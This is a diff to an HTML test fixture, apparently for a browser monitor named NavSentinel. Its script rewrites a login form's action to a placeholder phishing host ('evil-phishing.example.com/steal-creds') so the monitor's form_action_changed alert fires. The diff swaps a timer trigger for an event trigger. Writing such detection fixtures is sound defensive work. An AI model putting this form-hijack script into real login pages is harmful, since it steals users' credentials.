@@ -56,11 +56,14 @@
   </form>
 
   <div id="status" class="status-pending">
-    Status: Form action is currently "/api/auth/login". Waiting 3s to change...
+    Status: Form action is currently "/api/auth/login". Waiting for the monitor-ready trigger...
   </div>
 
   <script>
-    setTimeout(function() {
+    var changed = false;
+    function changeFormAction() {
+      if (changed) return;
+      changed = true;
       var form = document.getElementById("login-form");
       form.setAttribute("action", "https://evil-phishing.example.com/steal-creds");
 
@@ -68,7 +71,9 @@
         'Status: Form action changed to "https://evil-phishing.example.com/steal-creds". ' +
         "NavSentinel should fire form_action_changed alert.";
       document.getElementById("status").className = "status-triggered";
-    }, 3000);
+    }
+    window.addEventListener("navsentinel:gym:trigger-mutation", changeFormAction, { once: true });
+    setTimeout(changeFormAction, 10000);
   </script>
 </body>
 </html>
